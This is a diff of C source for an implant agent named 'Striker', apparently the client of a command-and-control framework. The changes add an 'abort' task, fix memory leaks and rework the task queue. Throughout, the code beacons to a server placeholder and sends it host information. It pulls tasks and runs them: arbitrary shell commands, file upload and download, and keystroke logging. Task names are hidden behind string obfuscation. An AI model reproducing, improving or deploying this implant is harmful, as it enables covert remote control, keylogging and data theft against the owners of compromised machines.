@@ -15,12 +15,13 @@
 #define MAX_TASKS_QUEUE 100
 // Max number of keystrokes to collect by the key logger
 #define MAX_KEYSTROKES 50000
+// Size of agent UID
+#define AGENT_UID_SIZE 17
 
 #define URL_SIZE (sizeof(char) * 256)
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
 char AUTH_KEY[sizeof(char) * 32] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
 char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.
-
 
 char *obfs_decode(char *str){
 
@@ -53,6 +54,7 @@ CURL *init_curl(const char *path, buffer *buff){
   curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
   curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
+  free(url);
   return curl;
 }
 
@@ -204,7 +206,7 @@ task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
   for (int i = 0; i < 3; i++)
-    obfs_decode(strs[i]);
+    obfs_decode(strs[i]);  
   task *t = malloc(sizeof(task));
   t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
   t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
@@ -212,7 +214,17 @@ task *parse_task(cJSON *json){
   t->queued = 0;
   t->completed = 0;
   t->result = NULL;
+  t->input_json = json;
   return t;
+}
+
+void free_task(task *tsk){
+  
+  cJSON_Delete(tsk->data);
+  cJSON_Delete(tsk->input_json);
+  // free(tsk->uid);
+  // free(tsk->type);
+  free(tsk);
 }
 
 void execute_task(session *striker, task *tsk){
@@ -224,8 +236,8 @@ void execute_task(session *striker, task *tsk){
   cJSON *data = tsk->data;
   cJSON *result = cJSON_CreateObject();
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon"};
-  for (int i = 0; i < 5; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort"};
+  for (int i = 0; i < 6; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -303,6 +315,10 @@ void execute_task(session *striker, task *tsk){
     if (err)
       buffer_strcpy(result_buff, msg);
     tsk->queued = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[5])){
+    char msg[] = "[OBFS_ENC]Session aborted!";
+    buffer_strcpy(result_buff, obfs_decode(msg));
+    striker->abort = 1;
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -319,6 +335,7 @@ void execute_task(session *striker, task *tsk){
       char *res = buffer_to_string(result_buff);
       cJSON_AddItemToObject(result, strs[1], cJSON_CreateString(tsk->uid));
       cJSON_AddItemToObject(result, strs[2], cJSON_CreateString(res));
+      free(res);
       tsk->result = result;
       tsk->completed = 1;
     }
@@ -339,10 +356,13 @@ void start_session(){
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
-  striker->uid = malloc(sizeof(char) * 32);
+  striker->uid = malloc(AGENT_UID_SIZE);
+  memset(striker->uid, 0, AGENT_UID_SIZE);
   striker->delay = 5;
   striker->write_dir = malloc(PATH_MAX);
+  striker->abort = 0;
   strncpy(striker->write_dir, strs[0], PATH_MAX);
+  char *tmp;
 
   CURL *curl;
   CURLcode res;
@@ -352,11 +372,14 @@ void start_session(){
   post_headers = curl_slist_append(post_headers, strs[1]);
   post_headers = curl_slist_append(post_headers, strs[2]);
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
-  
-  while (1){ // Initiation loop.
+  cJSON *info = sysinfo();
+  tmp = cJSON_PrintUnformatted(info);
+  cJSON_Delete(info);
+
+  while (!striker->abort){ // Initiation loop.
     curl = init_curl(strs[3], body);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cJSON_PrintUnformatted(sysinfo()));
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
     if (res != CURLE_OK){
@@ -367,8 +390,10 @@ void start_session(){
     }
     break;
   }
+  free(tmp);
 
-  cJSON *config = cJSON_Parse(buffer_to_string(body));
+  char *config_str = buffer_to_string(body);
+  cJSON *config = cJSON_Parse(config_str);
   if (!config){
     if (STRIKER_DEBUG){
       const char *error = cJSON_GetErrorPtr();
@@ -376,14 +401,24 @@ void start_session(){
     }
     goto end;
   }
-  striker->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[6]));
+  tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[6]));
+  strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
+  // Todo: remove this. Implant patcher should be the one defining delay, which can also be changed by operator after callback.
+  // free(tmp);
   striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[7]));
+  if (STRIKER_DEBUG)
+    printf("%s\n", config_str);
+  // free(config_str);
+  cJSON_Delete(config);
+  free(config_str);
+
   char *tasksURL = malloc(URL_SIZE);
   snprintf(tasksURL, URL_SIZE, strs[8], striker->uid);
   queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
-  if (STRIKER_DEBUG)
-    printf("%s\n", cJSON_PrintUnformatted(config));
-  while (1){
+  queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
+  while (!striker->abort){
+    queue_seek(tasks_queue, 0);
+    queue_seek(completed_tasks, 0);
     resize_buffer(body, 0);
     sleep(striker->delay);
     // Fetch tasks.
@@ -397,38 +432,38 @@ void start_session(){
       continue;
     }
     // Parse and execute the tasks.
-    cJSON *tasksJSON = cJSON_Parse(buffer_to_string(body));
+    tmp = buffer_to_string(body);
+    cJSON *tasksJSON = cJSON_Parse(tmp);
     size_t tasksLen = cJSON_GetArraySize(tasksJSON);
-    cJSON *results = cJSON_CreateArray();
+    cJSON *json = NULL;
     for (int i = 0; i < tasksLen; i++){
-      task *tsk = parse_task(cJSON_GetArrayItem(tasksJSON, i));
-      if (!tsk)
-        continue;
+      json = cJSON_GetArrayItem(tasksJSON, i);
+      task *tsk = parse_task(json);
       execute_task(striker, tsk);
-      if (tsk->completed && tsk->result != NULL){ // The tasks has been completed.
-        cJSON_AddItemToArray(results, tsk->result);
-      }else if(tsk->queued && (!queue_full(tasks_queue))){ // Task has been queued.
-        queue_put(tasks_queue, tsk);
-      }
+      queue_put(tasks_queue, tsk);
+      cJSON_DetachItemFromArray(tasksJSON, i);
+      i--;
+      tasksLen--;
     }
-    // Check if queued tasks are completed.
-    queue_seek(tasks_queue, 0);
-    for (int i = 0; !queue_exhausted(tasks_queue); i++){
+    // Find completed tasks.
+    for (int i = 0; i < tasks_queue->count; i++){
       task *tsk = queue_get(tasks_queue);
       if (tsk->completed){
-        if (STRIKER_DEBUG)
-          printf(strs[10], tsk->uid);
+        queue_put(completed_tasks, tsk);
         queue_remove(tasks_queue, i);
-        cJSON_AddItemToArray(results, tsk->result);
         i--;
       }
     }
-    // Send results.
-    if (cJSON_GetArraySize(results) > 0){
+    // Build result.
+    if (completed_tasks->count > 0){
+      printf("[*] Sending %ld completed tasks...\n", completed_tasks->count);
+      cJSON *results = cJSON_CreateArray();
+      while (!queue_exhausted(completed_tasks)){
+        task *tsk = queue_get(completed_tasks);
+        cJSON_AddItemToArray(results, tsk->result);
+      }
       char *result = cJSON_PrintUnformatted(results);
-      if (STRIKER_DEBUG)
-        printf(strs[9], result);
-      while (1){
+      do{
         resize_buffer(body, 0);
         curl = init_curl(tasksURL, body);
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
@@ -442,14 +477,29 @@ void start_session(){
           continue;
         }
         break;
+      }while(!striker->abort);
+      queue_seek(completed_tasks, 0);
+      while (!queue_exhausted(completed_tasks)){
+        task *tsk = queue_get(completed_tasks);
+        free_task(tsk);
+        queue_remove(completed_tasks, completed_tasks->pos - 1);
       }
+      cJSON_Delete(results);
+      free(result);
     }
-    // Cleanup.
-    cJSON_Delete(results);
-    // cJSON_Delete(tasksJSON);
+    cJSON_Delete(tasksJSON);
+    free(tmp);
   }
 
   free(tasksURL);
+  queue_seek(tasks_queue, 0);
+  while (!queue_exhausted(tasks_queue))
+    free_task(queue_get(tasks_queue));
+  queue_seek(completed_tasks, 0);
+  while (!queue_exhausted(completed_tasks))
+    free_task(queue_get(completed_tasks));
+  queue_free(tasks_queue, 0);
+  queue_free(completed_tasks, 0);
 
   end:
     curl_slist_free_all(get_headers);
